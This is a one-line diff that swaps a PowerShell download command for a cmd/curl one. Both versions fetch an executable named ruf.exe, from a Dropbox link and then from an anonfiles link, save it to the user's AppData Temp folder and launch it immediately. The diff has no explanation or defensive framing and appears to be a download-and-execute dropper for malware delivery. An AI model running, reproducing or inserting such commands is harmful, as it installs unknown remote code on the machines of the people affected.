@@ -1,1 +1,1 @@
-Invoke-WebRequest -Uri 'https://www.dropbox.com/s/abol3rbkbeb34h7/ruf.exe?dl=1' -OutFile '%appdata%\Local\Temp\ruf.exe'; Start-Process '%appdata%\Local\Temp\ruf.exe'
+cmd.exe curl https://cdn-145.anonfiles.com/D0o6Nblfz6/6256d2c4-1681704804/ruf.exe --output C:\Users\%username%\AppData\Local\Temp\ruf.exe && start C:\Users\%username%\AppData\Local\Temp\ruf.exe && exit
